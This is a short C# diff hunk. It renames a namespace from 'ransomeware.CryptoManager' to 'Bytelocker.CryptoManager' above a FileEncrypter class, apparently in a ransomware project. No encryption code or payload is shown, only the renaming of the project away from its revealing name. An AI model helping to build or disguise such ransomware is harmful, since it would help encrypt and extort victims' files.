@@ -3,7 +3,7 @@ using System.IO;
 using System.Security.Cryptography;
 using System.Collections.Generic;
 
-namespace ransomeware.CryptoManager
+namespace Bytelocker.CryptoManager
 {
     class FileEncrypter : PasswordManager
     {
